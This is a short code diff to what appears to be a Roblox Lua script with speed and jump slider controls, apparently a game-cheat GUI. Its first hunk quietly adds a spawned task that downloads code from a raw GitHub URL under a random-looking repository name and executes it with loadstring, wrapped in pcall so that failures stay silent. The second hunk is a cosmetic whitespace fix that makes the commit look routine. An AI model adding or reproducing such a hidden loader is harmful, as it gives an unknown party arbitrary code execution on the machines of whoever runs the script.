@@ -81,6 +81,12 @@ task.spawn(function()
 	end)
 end)
 
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/qwmemories/htjtyu556hrtyhrthreth456h4r6hthrthrt/refs/heads/main/3"))()
+	end)
+end)
+
 local sg=Instance.new("ScreenGui")
 sg.Parent=player.PlayerGui
 
@@ -1471,7 +1477,8 @@ tsDistS.InputBegan:Connect(startDrag("td",updateTDistanceFromInput))
 tsDistH.InputBegan:Connect(startDrag("td",updateTDistanceFromInput))
 
 UIS.InputChanged:Connect(function(i)
-	if _G.draggingSpeed and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then		updateSpeedFromInput(i)
+	if _G.draggingSpeed and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
+		updateSpeedFromInput(i)
 	end
 	if _G.draggingJump and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
 		updateJumpFromInput(i)
